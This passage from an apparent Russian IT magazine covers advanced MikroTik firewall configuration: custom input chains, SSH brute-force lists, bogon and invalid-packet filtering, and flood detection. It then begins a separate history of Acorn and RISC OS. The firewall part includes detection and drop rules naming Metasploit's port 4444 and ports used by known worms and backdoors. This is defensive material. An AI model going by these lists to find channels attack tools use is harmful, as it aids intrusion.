интернет по PPPoE, то в WAN‐лист надо добавить именно его. Если IP локаль‐
ной сети прописан на бридже или VLAN'е, то и в лист LAN нужно добавить их,
а не физические интерфейсы. Если включить в список и логический,
и физический интерфейс, ничего страшного произойти не должно, но это
нужно будет учитывать в конфигурации.
  Но это еще не все. Понят но, что в каждом филиале у нас будет своя под‐
сеть LAN: где‐то 192.168.10.0/24, где‐то 192.168.11.0/24. Чтобы не путаться
с этими значениями и не менять конфиг при переносе с одного роутера
на другой, оперировать будем не адресами и подсетями, а списками адре‐
сов. На каждом роутере соз даем список LAN и дальше работаем только
с ним.
  В прошлый раз мы соз давали адрес‐лист MGMT, в котором открывали
доступ к управлению роутером только с определенных адресов. А еще рань‐
ше рассматривали решение Port Knocking, которое предоставляет доступ
к управлению, только если со стороны клиента выполнить секретные манипу‐
ляции. Для доступа к роутеру из доверенной сети (LAN) впол не под ходит
вариант с адрес‐листом, а для дос тупа сна ружи — Port Knocking. Было бы
хорошо совместить эти варианты в нашей конфигурации. Еще будет удобно
разделить цепочку input на две части: input со стороны интернета и input
со стороны локалки. Тогда можно применять разные политики фильтрации
к разным сегментам сети. В этом нам помогут поль зовательские цепочки.
   Все, что пришло сна ружи, перекидыва ем в новую цепочку WAN_INPUT. Все,
что изнутри, — в LAN_INPUT:


/ip firewall filter
add action= jump chain= input in‐interface‐list= WAN jump‐target= WAN_IN‐
PUT
add action= jump chain= input in‐interface‐list= LAN jump‐target= LAN_IN‐
PUT

Теперь политики фильтрации будут разными для раз ного источника трафика.
Для внешнего трафика будем использовать цепочку WAN_INPUT и более жес‐
ткие ограничения, для внутреннего — LAN_INPUT и правила попроще. Цепоч‐
ка input нам больше не нуж на, теперь мы все будем делать в новых цепочках.
Причем указывать интерфейсы или списки интерфейсов в правилах больше
не понадобится. Однако этот подход может использоваться в сложных
решениях, например когда у тебя два про вай дера с разными политиками
фильтрации или локалка поделена на разные VLAN. Но об этом позже.
  В статье о безопасной настройке роутера мы настраивали Port Knocking
для доступа к управлению роутером. Ограничивать таким образом доступ
изнутри локальной сети — излишество. Поэтому поменяем в правилах цепоч‐
ку с input на WAN_INPUT. Изнутри сети раз решим доступ к WinBox только
с нужных адресов: мы уже делали это в статье про основы файрвола. Оставим
в правиле только порт WinBox — TCP 8291. А для SSH разрешим подклю‐
чения из всей нашей сети, но предотвратим возможность брутфорса (да,
изнутри сети тоже может произойти брутфорс SSH, потому что отсутствие
троянов в ней не гарантировано).


add action= drop chain= LAN_INPUT comment="drop ssh brute forcers" src‐
address‐list= ssh_blacklist
add action= add‐src‐to‐address‐list address‐list= ssh_blacklist ad‐
dress‐list‐timeout= 1w3d chain= LAN_INPUT connection‐state= new dst‐port
= 22 protocol= tcp src‐address‐list= ssh_stage3
add action= add‐src‐to‐address‐list address‐list= ssh_stage3 address‐
list‐timeout= 1m chain= LAN_INPUT connection‐state= new dst‐port= 22
protocol= tcp src‐address‐list= ssh_stage2
add action= add‐src‐to‐address‐list address‐list= ssh_stage2 address‐
list‐timeout= 1m chain= LAN_INPUT connection‐state= new dst‐port= 22
protocol= tcp src‐address‐list= ssh_stage1
add action= add‐src‐to‐address‐list address‐list= ssh_stage1 address‐
list‐timeout= 1m chain= LAN_INPUT connection‐state= new dst‐port= 22
protocol= tcp src‐address‐list=!ssh_open
add action= accept chain= LAN_INPUT dst‐port= 22 protocol= tcp

Тут применяется механизм динамичес ких адрес‐лис тов с тайм‐аутами. Мы
рассматривали их в статье «Защищаем MikroTik. Хитрости безопас ной нас‐
тройки роутера». При первой попытке подключения пакет обработается пра‐
вилом 5, и адрес хакера попадет в адрес‐лист ssh_stage1. Вторая попытка
подклю чения обработается пра вилом 4 и добавит брутфорсера в лист
ssh_stage2. И так далее вплоть до листа ssh_blacklist, где адрес будет
храниться десять дней, а весь тра фик, идущий с адресов из этого списка,
будет дропаться.
  В прошлой статье мы создавали пра вила, разрешающие коннекты estab‐
lished, related и запрещающие  invalid. Давай продублируем эти правила
и перенесем их в новые цепочки, а из input уда лим. В результате мы получим
четыре правила вместо двух. На прохождение тра фика это не повлияет, зато
позволит видеть статистику по трафику с разных сторон. В правиле с estab‐
lished, related поставь галочку untracked. Чуть позже объ ясню, зачем она.
Думаю, адап тировать остальные правила под новую логику не составит тру да.
В конце каждой цепоч ки не забудь указать правило дропа.





                 Должно получиться примерно так

Две цепочки позволят нам уменьшить количество переходов трафика по пра‐
вилам, а значит, и немного снизить наг рузку на CPU. Счетчики в разных
цепочках дадут возможность увидеть чуть более детальную статистику тра‐
фика. Хоть правил и стало больше, но они не применяются ко всему объ ему
трафика: при первом джампе весь тра фик будет обрабаты ваться уже новой
цепочкой и в другую никогда не попадет. Подобный подход также упрощает
поддержку за счет того, что по названию цепочки сра зу видно, что это за тра‐
фик и откуда он идет. Можно для раз ных типов трафика создавать свои
цепочки, например отдельную цепочку для management‐трафика. За возврат
трафика в родительскую цепочку отвечает action return.


ЗАЩИЩАЕМСЯ ОТ АТАК
До сих пор мы рассматривали пра вила файрво ла, поз воляющие обрабаты‐
вать трафик по простым признакам: интерфей су, адресу, порту. Но файрвол
гораздо более гибкий инстру мент, с его помощью можно строить сложную
логику для противодействия разным типам атак.
   Есть зарезервированные адреса, которые не используются в интерне те.
Они называются «богон‐адресами». Отсечем пакеты с таких адре сов:


/ip firewall address‐list
add address= 0.0.0.0/8 comment="Self‐Identification [RFC 3330]" list=
Bogon
add address= 10.0.0.0/8 comment="Private[RFC 1918] ‐ CLASS A" list= Bo‐
gon
add address= 127.0.0.0/16 comment="Loopback [RFC 3330]" list= Bogon
add address= 169.254.0.0/16 comment="Link Local [RFC 3330]" list= Bogon
add address= 172.16.0.0/12 comment="Private[RFC 1918] ‐ CLASS B" list=
Bogon
add address= 192.168.0.0/16 comment="Private[RFC 1918] ‐ CLASS C" list
= Bogon
add address= 192.0.2.0/24 comment="Reserved ‐ IANA ‐ TestNet1" list=
Bogon
add address= 192.88.99.0/24 comment="6to4 Relay Anycast [RFC 3068]"
list= Bogon
add address= 198.18.0.0/15 comment="NIDB Testing" list= Bogon
add address= 198.51.100.0/24 comment="Reserved ‐ IANA ‐ TestNet2" list
= Bogon
add address= 203.0.113.0/24 comment="Reserved ‐ IANA ‐ TestNet3" list=
Bogon
add address= 224.0.0.0/4 comment="MC, Class D, IANA" list= Bogon

Мы ожидаем пакеты только с юникаст‐адресов, поэтому запретим все, кроме
них.





                           Drop non unicast

Port Scan Detect — функция, позволяющая обна ружить сканер портов.
Как она работает? Портам зада ется некий условный вес — Weight. Причем
для системных портов (до 1024‐го) весовой коэффициент низ кий (Low ports),
а для остальных — высокий (High ports). Если в течение времени Delay Thresh‐
old от одного хоста на роутер прилетят пакеты на порты, сумма весов которых
окажется больше, чем Weight Threshold, то адрес отправите ля будет добавлен
в блек‐лист. В нашем примере, если с одного хоста за три секунды поступят
десять пакетов на порты до 1024‐го (общий вес 10 * 2 = 20) и двадцать
пакетов на порты выше 1024‐го (20 * 1 = 20), общий их вес составит 40.
Обрати внимание, что Port Scan Detect работает только для TCP‐ или UDP‐
трафика.





                    Защищаемся от сканеров

Один из самых распространенных видов атак — это атака на отказ в обслу‐
живании, или DDoS. Защититься от нее своими силами практически нереаль‐
но. Но с помощью прос того правила можно отсечь самые прос тые попытки
атаки. Находим хост, который насоз давал к нам боль ше 100 сессий, и добав‐
ляем его в блек‐лист. В этом пра виле обязательно нужно использовать
параметр connection‐state=new. Но мы ведь уже разрешили все estab‐
lished, related и untracked, а invalid дроп нули, поэтому сюда дойдут только
пакеты new. Оставлять или нет этот флажок в пра виле — твое дело. Отме чу,
что с помощью этой же фичи можно выявлять в сво ей сети торрентокачаль‐
щиков.





                      Защищаемся от DDoS

ICMP — один из важных протоколов в любой сети. Многие админы любят бло‐
кировать его, но это очень пло хой подход. Именно ICMP позволяет работать
трассиров ке, указывать на недос тупность UDP‐портов, отправлять раз ные
служебные сообщения. И если запретить его полностью, можно наловить кучу
багов. У каждого сообщения ICMP свое предназна чение, и уже по этому
параметру нетрудно понять, имеет ли смысл раз решить какие‐то типы ICMP
изнутри сети или снаружи. Нап ример:
 • ICMP Echo Request — наш любимый пинг, имеет тип 8, код 0;
 • ICMP Echo Reply — ответ на пинг, тип 0, код 0;
 • Destination Unreachable — узел недоступен, тип 3 и коды 0–15 в зависи‐
  мости от причины недоступности:
    • 0 — сеть недоступна;
    • 1 — хост недоступен;
    • 2 — протокол недос тупен;
    • 3 — порт недоступен;
    • 4 — необходима фрагментация пакета, но она запрещена (стоит флаг
    DF — Don’t Fragment).

Остальное легко найти в интернете, а лучше почитать RFC 792.
  Создадим цепочку ICMP и отправим в нее весь ICMP‐трафик (можно соз‐
дать две цепочки: для LAN и WAN — и настро ить разные политики). Разреша‐
ем только нужные типы сообщений и огра ничиваем обработку пятью пакета‐
ми в секунду:


/ip firewall filter
add action= jump chain= WAN_INPUT jump‐target= ICMP protocol= icmp
add action= jump chain= LAN_INPUT jump‐target= ICMP protocol= icmp
add action= accept chain= ICMP comment="Allow Echo Reply (0:0‐255),
Limit 5pps" icmp‐options= 0:0‐255 limit= 5,5:packet protocol= icmp
add action= accept chain= ICMP comment="ICMP ‐ Allow Destination
Unreachable (3:0‐255), Limit 5pps" icmp‐options= 3:0‐255 limit=
5,5:packet protocol= icmp
add action= accept chain= ICMP comment="ICMP ‐ Allow Source Quench (4:
0), Limit 5pps" icmp‐options= 4:0‐255 limit= 5,5:packet protocol= icmp
add action= accept chain= ICMP comment="ICMP ‐ Allow Echo Request (8:
0), Limit 5pps" icmp‐options= 8:0‐255 limit= 5,5:packet protocol= icmp
add action= accept chain= ICMP comment="ICMP ‐ Allow Time Exceeded (11:
0), Limit 5pps" icmp‐options= 11:0‐255 limit= 5,5:packet protocol= icmp
add action= accept chain= ICMP comment="ICMP ‐ Allow Parameter Bar (12:
0), Limit 5pps" icmp‐options= 12:0‐255 limit= 5,5:packet protocol= icmp
add action= drop chain= ICMP comment="ICMP ‐ Drop All Others" protocol=
icmp





                     Пример пра вила ICMP

TCP тоже поддерживает кучу флагов, часть которых не может содержаться
в одном пакете. Комбинации этих флагов час то используются сканерами пор‐
тов, чтобы пробить пло хо настроенную защиту. Сделаем отдельную цепочку
для TCP и дропнем подоб ные «подозритель ные» пакеты:


/ip firewall filter
add action= jump chain= WAN_INPUT comment="Invalid TCP" jump‐target= in‐
valid_tcp protocol= tcp
add action= jump chain= LAN_INPUT comment="Invalid TCP" jump‐target= in‐
valid_tcp protocol= tcp
add action= jump chain= forward comment="Invalid TCP" jump‐target= in‐
valid_tcp protocol= tcp
add action= drop chain= invalid_tcp comment="Invalid TCP ‐ !(FIN/SYN/
RST/ACK)" protocol= tcp tcp‐flags=!fin,!syn,!rst,!ack
add action= drop chain= invalid_tcp comment="Invalid TCP ‐ FIN/SYN"
protocol= tcp tcp‐flags= fin,syn
add action= drop chain= invalid_tcp comment="Invalid TCP ‐ FIN/RST"
protocol= tcp tcp‐flags= fin,rst
add action= drop chain= invalid_tcp comment="Invalid TCP ‐ FIN/!ACK"
protocol= tcp tcp‐flags= fin,!ack
add action= drop chain= invalid_tcp comment="Invalid TCP ‐ FIN/URG"
protocol= tcp tcp‐flags= fin,urg
add action= drop chain= invalid_tcp comment="Invalid TCP ‐ SYN/RST"
protocol= tcp tcp‐flags= syn,rst
add action= drop chain= invalid_tcp comment="Invalid TCP ‐ RST/URG"
protocol= tcp tcp‐flags= rst,urg
add action= drop chain= invalid_tcp comment="Invalid TCP ‐ Source Port
0" protocol= tcp src‐port= 0
add action= drop chain= invalid_tcp comment="Invalid TCP ‐ Destination
Port 0" dst‐port= 0 protocol= tcp





                     Пример с TCP‐флагами

То же самое для UDP:


add action= drop chain= invalid_udp comment="Invalid UDP ‐ Source Port
0" protocol= udp src‐port= 0
add action= drop chain= invalid_udp comment="Invalid UDP ‐ Destination
Port 0" dst‐port= 0 protocol= udp


ЦЕПОЧКА FORWARD
До сих пор мы в основном смотрели на трафик, прилетевший в input‐цепочку,
а дальше по каким‐то признакам нап равляли его в раз ные цепочки. Но весь
этот трафик предназначался самому роутеру. Цепочку output используют ред‐
ко, но ты можешь отфильтро вать в ней, нап ример, ICMP‐ответы от роутера
или IPsec‐трафик. Понятно, что большая часть тра фика будет попадать в for‐
ward — ведь на то он и роутер, что бы перенап равлять пакеты из одной сети
(локалка) в другую (интернет или вто рой VLAN локал ки). И в этой цепочке мы
будем управлять трафиком пользователей.
  Я не стану детально рассказывать о том, что надо разрешить или зап‐
ретить, — об основных приемах настройки и так уже написано несколько ста‐
тей и есть куча примеров в интернете. Рас смот рим более интересный кейс:
репутацию сети.
  В интерне те есть сервисы, содержащие списки спамеров, ддосеров, рас‐
пространителей нелегального контента. Если на машины в твоей сети попал
троян‐спамер, то ты тоже ока жешь ся в этих спис ках. Через какое‐то время
письма от любого клиента изнутри сети начнут попадать в спам у всех получа‐
телей, потом ты будешь добавлен в публичные блек‐листы и у пользовате лей
исчезнет доступ ко многим ресурсам. В том чис ле к сетям партнеров, админы
которых пользуются такими списками, чтобы запретить доступ потенциаль‐
ным вредите лям. Представь, что произойдет с тво ей премией, когда письмо
с многомиллионным контрактом от твоего шефа упа дет у контрагента в папку
«Спам».
  Попробуем защитить свою премию. Для этого нужно понять, по какому
поводу нас могут внести в списки. Причин этому несколько:
 • мы часть DoS‐ или ино го ботнета;
 • мы рассылаем спам;
 • с наших адре сов брутфорсят чужие сервисы;
 • мы нарушаем автор ские права (раз даем торренты).

Некоторые читатели этой статьи вполне могли учас твовать в DDoS‐ботнете,
сами того не осознавая. Ата ки UDP Ampliﬁcation основаны на некорректных
настройках сервисов, когда можно обра титься к ним с просьбой узнать что‐то
у другого сервера. Например, к нам может прилететь DNS‐запрос с просьбой
отрезолвить адрес жертвы. И таких, как мы, миллионы. Когда к жертве пос‐
тупит миллион пакетов в секунду, она не обрадуется, а мы увидим загрузку
CPU под 100%, жуткие тормоза и однажды ока жемся в блек‐листе. Такая же
схема работает и с другими UDP‐сервисами, например NTP. Вывод простой:
блокируй трафик к этим сервисам снаружи. Но это все еще про INPUT.
  Не только роутер может быть частью такого бот нета, но и машины внутри
сети. Для детекта таких хос тов воспользуемся уже известной фичей connec‐
tion limit.


/ip firewall filter
add action= add‐src‐to‐address‐list address‐list= dns‐flood address‐
list‐timeout= none‐dynamic chain= forward comment="DNS Flood" connec‐
tion‐limit= 100,32 dst‐port= 53 in‐interface‐list= LAN protocol= udp
add action= add‐src‐to‐address‐list address‐list= smb‐flood address‐
list‐timeout= none‐dynamic chain= forward comment="SMB Flood" connec‐
tion‐limit= 100,32 dst‐port= 445 in‐interface‐list= LAN protocol= tcp
add action= add‐src‐to‐address‐list address‐list= telnet‐flood address‐
list‐timeout= none‐dynamic chain= forward comment="Telnet Flood" con‐
nection‐limit= 20,32 dst‐port= 23 in‐interface‐list= LAN protocol= tcp
add action= add‐src‐to‐address‐list address‐list= ssh‐flood address‐
list‐timeout= none‐dynamic chain= forward comment="SSH Flood" connec‐
tion‐limit= 20,32 dst‐port= 22 in‐interface‐list= LAN protocol= tcp
add action= add‐src‐to‐address‐list address‐list= snpp‐flood address‐
list‐timeout= none‐dynamic chain= forward comment="SNPP Flood" connec‐
tion‐limit= 20,32 dst‐port= 444 in‐interface‐list= LAN protocol= tcp
add action= add‐src‐to‐address‐list address‐list= msf‐indication ad‐
dress‐list‐timeout= none‐dynamic chain= forward comment="Metasploit
Indication" connection‐limit= 20,32 dst‐port= 4444 in‐interface‐list=
LAN protocol= tcp

Слишком «толстые» потоки тоже могут вызывать подозрения. Залогируем их:


add action= log chain= forward comment="Abnormal Traffic" connection‐
bytes= 80000000 in‐interface‐list= LAN log‐prefix= Abnormal‐Traffic

По порту назначения можно определить, к какому сервису обращаются хос ты
изнутри нашей сети. И если это общеизвес тный порт, например СУБД, а все
наши базы расположены внутри периметра, логично пред положить, что сотни
пакетов в секунду к этому порту в интернете с компьютера бухгалтера —
не простая ошибка и не личный интерес самого бухгалтера. Дропаем подоз‐
рительные пакеты и возвра щаемся в родительскую цепочку (пос леднее пра‐
вило):


add action= jump chain= forward comment="Jump to Virus Chain" disabled=
no jump‐target= Virus
add action= drop chain= Virus comment="Drop Blaster Worm" disabled= no
dst‐port= 135‐139 protocol= tcp
add action= drop chain= Virus comment="Drop Blaster Worm" disabled= no
dst‐port= 445 protocol= tcp
add action= drop chain= Virus comment="Drop Blaster Worm" disabled= no
dst‐port= 445 protocol= udp
add action= drop chain= Virus comment="Drop Messenger Worm" disabled= no
dst‐port= 135‐139 protocol= udp
add action= drop chain= Virus comment= Conficker disabled= no dst‐port=
593 protocol= tcp
add action= drop chain= Virus comment= Worm disabled= no dst‐port= 1024‐
1030 protocol= tcp
add action= drop chain= Virus comment="ndm requester" disabled= no dst‐
port= 1363 protocol= tcp
add action= drop chain= Virus comment="ndm server" disabled= no dst‐port
= 1364 protocol= tcp
add action= drop chain= Virus comment="screen cast" disabled= no dst‐
port= 1368 protocol= tcp
add action= drop chain= Virus comment= hromgrafx disabled= no dst‐port=
1373 protocol= tcp
add action= drop chain= Virus comment="Drop MyDoom" disabled= no dst‐
port= 1080 protocol= tcp
add action= drop chain= Virus comment= cichlid disabled= no dst‐port= 1377
protocol= tcp
add action= drop chain= Virus comment= Worm disabled= no dst‐port= 1433‐
1434 protocol= tcp
add action= drop chain= Virus comment="Drop Dumaru.Y" disabled= no dst‐
port= 2283 protocol= tcp
add action= drop chain= Virus comment="Drop Beagle" disabled= no dst‐
port= 2535 protocol= tcp
add action= drop chain= Virus comment="Drop Beagle.C‐K" disabled= no
dst‐port= 2745 protocol= tcp
add action= drop chain= Virus comment="Drop MyDoom" disabled= no dst‐
port= 3127‐3128 protocol= tcp
add action= drop chain= Virus comment="Drop Backdoor OptixPro" disabled
= no dst‐port= 3410 protocol= tcp
add action= drop chain= Virus comment="Drop Sasser" disabled= no dst‐
port= 5554 protocol= tcp
add action= drop chain= Virus comment= Worm disabled= no dst‐port= 4444
protocol= tcp
add action= drop chain= Virus comment= Worm disabled= no dst‐port= 4444
protocol= udp
add action= drop chain= Virus comment="Drop Beagle.B" disabled= no dst‐
port= 8866 protocol= tcp
add action= drop chain= Virus comment="Drop Dabber.A‐B" disabled= no
dst‐port= 9898 protocol= tcp
add action= drop chain= Virus comment="Drop Dumaru.Y" disabled= no dst‐
port= 10000 protocol= tcp
add action= drop chain= Virus comment="Drop MyDoom.B" disabled= no dst‐
port= 10080 protocol= tcp
add action= drop chain= Virus comment="Drop NetBus" disabled= no dst‐
port= 12345 protocol= tcp
add action= drop chain= Virus comment="Drop Kuang2" disabled= no dst‐
port= 17300 protocol= tcp
add action= drop chain= Virus comment="Drop SubSeven" disabled= no dst‐
port= 27374 protocol= tcp
add action= drop chain= Virus comment="Drop PhatBot, Agobot, Gaobot"
disabled= no dst‐port= 65506 protocol= tcp
add action= drop chain= Virus comment="Drop MemCached flood" disabled=
no dst‐port= 11211 protocol= udp
add action=return chain= Virus comment="Return From Virus Chain"
disabled= no


ЗАКЛЮЧЕНИЕ
Мы рассмотрели более продвинутые методы нас тройки файрвола. Эту
статью не нужно воспринимать как инструкцию по настройке: у каждой сети
свои особенности и сервисы. Роутеры у всех тоже разные — у кого‐то он спо‐
койно обработает тысячи неоптимизированных пра вил файрвола, для дру гих
сотня правил будет обрабатывать ся с трудом. Поэтому подходи к настройке
файрвола с умом.
  В две статьи всё не вмес тишь, и мы не затронули еще несколько больших
тем: таблицы NAT, RAW, IPv6 Firewall, Bridge Firewall, фильтрацию по контенту,
определение типа трафика по его содержимому (когда мы меня ем порт
у HTTP, а файрвол все равно понимает, что внут ри HTTP), проксирование тра‐
фика.
  Все  эти темы  рас сматриваются  в официальном  обучающем  курсе
MikroTik — MikroTik Certiﬁed Traﬃc Control Engineer. Но чтобы на него попасть,
нужно пройти курс MikroTik Certiﬁed Network Associate, где изу чаются общие
принципы настройки роутера и работа TCP/IP.


        WWW

                       Узнать больше о курсах (и записаться на них)
                   можно:
                  •на моем сайте
                  •на сайте MikroTik
 GEEK
RISC
БЕЗ РИСКА





 СТАВИМ RISC OS
 НА RASPBERRY PI,
 ЧТОБЫ ПРИКОСНУТЬСЯ
 К ИСТОРИИ





    Валентин Холмогоров
      valentin@holmogorov.ru





 Для Raspberry Pi и его многочисленных клонов адаптировано
 множес тво операционных систем — одних только версий
 «Линукса»  нас читыва ется  больше  полутора  десятков.
 Но есть в этом ряду оригинальная и почти забытая ОС,
 получившая с широким распространением «малинок» вто‐
 рой шанс возродиться из небытия. Речь о RISC OS — плат‐
 форме с британским акцентом родом из восьмидесятых,
 которую когда‐то создали сами разработчики архитектуры
 ARM.


 КАК ВСЕ НАЧИНАЛОСЬ
 Скромная кембриджская компания Acorn с самых первых дней своего сущес‐
  твования подвергалась жесточайшему прессингу со стороны фирм — про‐
  изводителей серийных пер сональных компьютеров. Основанная в 1978 году
  Германом Хаузе ром и Крисом Карри, на первоначальном этапе своего раз‐
  вития Acorn выпустила в общей сложности всего лишь пятьсот тысяч ПК,
  большая часть которых была продана в Великобритании, Ирландии и Италии.
 Значительное количество этих машин пос тупило в британские школы в качес‐
  тве наглядных пособий для изучения прин ципов работы с персонал ками.
    Примечательно, что эта компания стала в итоге одной из немногих фирм,
  которые, подобно Apple, соз давали свои компьютеры полностью — от про‐
  цессоров и периферийных устройств до операци онной сис темы и прикладно‐
  го софта.


              INFO

                     До момента основания Acorn Крис Карри работал
                        над  созданием  комплек та  для  сборки  мик‐
                        рокомпьютера с Клайвом Син клером, автором
                          легендарного компьюте ра Sinclair ZX Spectrum.
                      Однако сэр Клайв не проявил желания развивать
                         дальше это направление, в то время как биз‐
                       несом  заинтересовался  друг  Карри  Герман
                          Хаузер, который и стал соучредителем Acorn.
                         Название было выбрано по двум причинам:
                         во‐первых, желудь символизировал направлен‐
                          ность компании на рост и развитие, а во‐вторых,
                          Acorn значился в алфавитном телефонном спра‐
                         вочнике раньше Apple Computers.


 К началу восьмидесятых годов фактичес ки все школы Великобритании были
 оборудованы компьютерами Acorn. Одним из первенцев стала машина
  с незатейливым названием Micro, которую Acorn раз работала по заказу ком‐
  пании British Broadcasting Corporation (BBC). Чуть поз же инженеры Acorn соз‐
  дали альтернативу этой машине под наз ванием Electron. По большому счету
  это была бюджетная вер сия BBC Micro, оборудованная 32 Кбайт оперативки
  и процессором MOS 6502. Именно с помощью Electron английские школь‐
  ники начала 1980‐х изучали азы программирования с использовани ем встро‐
  енного бейсика.  Electron поз волял  заг ружать и записы вать программы
  на обычный магнитофон, а вмес то монитора использовался бытовой телеви‐
  зор. Благодаря отно сительно невысокой стоимости и отличным характерис‐
  тикам Acorn Electron быстро завоевал популярность у пользователей, сос‐
  тавив достойную конкуренцию ZX Spectrum.





    Компьютер Acorn Electron — один из наиболее популярных ПК от Acorn

 Первая операционная система, предназна ченная для использования на пер‐
  сональных компьютерах Acorn, была клоном платформы MOS, выпущенной
  в 1983 году той же компанией BBC. Acorn приобрел у BBC лицензию на даль‐
 нейшую разработку и экс плуатацию этой системы, благодаря чему прог‐
 раммисты получили в свое рас поряжение исходники ядра MOS и нескольких
  базовых утилит. Они могли не только адаптировать их под собственное
  железо, но и совершенствовать софт по своему усмотрению, что стало неп‐
  лохим подспорьем в про ектировании операционки. Однако 8‐битные про‐
  цессоры уже не удовлетво ряли техничес ким вызовам того времени, нас тал
 момент штурмовать новые горизонты.


 ARCHIMEDES
 Появление архитектуры RISC поз волило многим компаниям, в числе которых
 были гиганты вроде IBM и Sun, создавать про цес соры нового поколе ния.
 Отметилась в ряду производителей и более скромная Acorn. Компания сфор‐
 мировала для этих целей отдельное подразделение — Advanced RISC Ma‐
  chines (ARM). А разработкой и раз витием операционной системы под про‐
  цессоры ARM занялось дру гое подразделение компании — Acorn RISC Tech‐
  nologies (ART).
    Новым флагманом компании стал ПК Acorn Archimedes, анонсированный
  в 1987 году. Эти машины были оснащены 32‐бит ным процессором ARM3,
 функционировавшим на час тотах до 25 МГц. Они позволяли отображать
  на экране графику с разрешением до 800 × 600 точек с цветовой палитрой
 до 256 цветов, выводить 8‐битный стереозвук по восьми различным каналам
  и комплектовались 4 Мбайт оперативной памяти (до 16 Мбайт в более поз‐
  дних модификациях).





   Компьютер Acorn Archimedes — машина из восьмидеся тых с 32‐раз‐
   рядным процессором ARM

 По производительности и техничес ким характеристикам «Архимед» от Acorn
  легко уделывал бы безраздельно царство вавший тог да на рынке IBM PC 386,
  если бы не одно но. Для мощной машины с 32‐раз рядным процессором тре‐
  бовалась соответствующая операционная система, которая могла бы адек‐
  ватно использовать все имеющиеся в ее распоряжении аппаратные ресурсы.
 Однако к тому моменту отдел корпорации, занима ющийся производс твом
 софта, уже полностью исчерпал отведенный ему для данных целей бюджет,
  и  вместо  полноцен ной  многоза дачной ОС  с  оконным  графичес ким
  интерфейсом пользователи получили ее однозадачную и не слишком удоб‐
 ную в работе замену, которую разработ чики наз вали Arthur OS.





    Arthur OS (сверху) и Microsoft Windows 1.0 (снизу) — найди десять отли‐
    чий

 Время шло, и на горизонте зама ячила перспектива запуска в серийное про‐
  изводство нового, более совершенного поколения нас тольных компьютеров
  Acorn — RiscPC. Намечался весь ма ощутимый раз рыв между стремительно
  растущими возможностями железа и никак не успевающим за ним системным
  программным обеспечением. Программисты Acorn стали в ударных темпах
  наверстывать упущенное, совершенствуя, отлаживая, допиливая и дописывая
  Arthur OS. Так появилась на свет RISC OS — сис тема, под управлением
  которой работали последние поколения Archimedes и более продвинутые
 ARM‐персоналки RiscPC от Acorn.


 RISC OS
 Видимо, вдохновившись творчес твом Джорджа Лукаса, который начал сни‐
  мать «Звездные вой ны» сра зу с четвертого эпизода, в1989 году Acorn выпус‐
  тила вторую версию RISC OS, минуя первую. Эта сис тема вышла как обновле‐
  ние для Arthur OS, одна ко она стала значитель ным шагом впе ред по срав‐
 нению с предыдущей платформой Acorn. Преж де всего потому, что обладала
  полноценным, хорошо продуманным оконным интерфейсом и под держивала
 многозадачный режим. Тем не менее в качестве ядра этой опе рационной
  системы все еще использовалось ядро Arthur OS, базирующееся на системе
  команд MOS. Лишь с появлением в 1991 году RISC OS 3, призванной стать
  полноценным аналогом Microsoft Windows 3.1 для компьютеров Acorn, прог‐
 раммистам этой компании удалось соз дать что‐то по‐настояще му свое.
    Интерфейс RISC OS 3 был довольно прос тым и лаконичным. Рас положен‐
  ная в нижней части экрана панель задач выполняла вполне традиционные
  для нее функции: на ней отображались значки всех запущенных приложений
  и активных дисковых накопителей, дос туп к сис темному меню откры вался
  при нажатии мышью на расположенный справа зна чок желудя — логотипа
  корпорации Acorn. А вот элементы управления окна ми имели нестандартное
  назначение: кнопка, рас положенная в верхнем левом углу окна, делала окно
  неактивным, размещая его позади всех остальных окон, но не закрывая его.
  Кнопка с изображением наклонного крес та закрыва ет окно, но не обязатель‐
  но использующее его приложение (эту идею раз работчики, видимо, позаимс‐
  твовали у macOS). И наконец, кнопка, расположенная в правом верхнем углу,
  управляет размерами окон, позволяя раз ворачивать их во весь экран
  или масштабировать до границ, установленных пользователем с помощью
 мыши в прошлый раз.





                RISC OS 3: еще не Windows, но уже что‐то

 Рабочий стол RISC OS 3 включал значки управления настрой ками системы,
  конфигурации интерфейса и вызова справочной службы. Программы, ана‐
  логичные проводнику Windows или утилите Finder macOS, в RISC OS отсутс‐
  твовали, навигация по файловой системе была реализована примерно так
  же, как в Windows 3.1, — с помощью окна специальной «коммутаци онной
  панели», содержащей папки и ярлыки хра нящихся на дисках файлов. Отсутс‐
  твовала также и корзина.
   В 1994 году на рын ке появилась очередная модификация операционной
  системы — RISC OS 3.5, чуть позже были выпущены RISC OS 3.6 и 3.7, однако
  все последующие реализации платформы осо бо не отличались от третьей
  версии RISC OS ни в архитектурном, ни в дизай нерском плане.
    Все резко изменилось, ког да в 1997 году Acorn анонсировала ожи‐
 дающийся в недалеком будущем выпуск RISC OS 4.0. Эта платформа обла‐
  дала уже полноцен ным графичес ким интерфейсом, способным работать
  на всех экранных разрешениях, дос тупных для компь юте ров Acorn, с высоким
  количеством цветов системной палитры, и отличалась прекрасно выпол‐
 ненным псевдотрехмерным оформлением. RISC OS 4 поддерживала тех‐
  нологии мультимедиа, работу с интернетом, поз воляла подключать компь‐
 ютеры Acorn к локальной сети. Новая версия была пол ностью совместима
  с предыдущими реализациями RISC OS, что поз воляло пользователям миг‐
  рировать  с ранних версий операционных  систем  Acorn  на RISC OS
 4 без замены прикладно го программного обес печения. В составе ОС
  появился удобный дисковый менеджер, с помощью которого пользователь
  мог без труда обращать ся к хра нящимся на компь ютере данным, и командная
  консоль, подобная терминалу в *nix. Программные эмуляторы позволяли
  запустить на компьютерах Acorn приложения MS Windows и даже некоторые
  программы для macOS.





           RISC OS 4 выглядит футуристично для своего времени

 Однако к середине девянос тых пользователи стали отдавать предпочтение
  более дешевым и доступным ПК на осно ве архи тектуры IBM PC. Множество
 компаний по всему свету наладили выпуск недорогих IBM‐совместимых ком‐
  плектующих, что также сра ботало на популярность платформы. В конкурен‐
  тной борьбе с Intel и IBM смогла выжить раз ве что Apple, ушедшая в узкоспе‐
  циализированный потребительский сегмент компь юте ров для издателей,
  дизайнеров и музыкантов. Для Acorn подходящей рыночной ниши не наш‐
  лось.
    Оказавшись вытесненной с рынка персоналок, Acorn переключилась
  на другие сферы технологий: в час тности, подразделение ARM, занимав‐
 шееся разработкой и выпуском процес соров, превратилось в самостоятель‐
 ную быстро растущую компанию. В 1998 году все проекты корпорации, свя‐
  занные с производством персональных компь ютеров, были окончательно
  свернуты, и эволюция операционных систем семейства RISC на этом прек‐
  ратилась. Казалось бы, конец истории. Если бы не появление одноплатных
  компьютеров, использующих в своей основе чипы ARM.


 ВТОРОЕ ДЫХАНИЕ
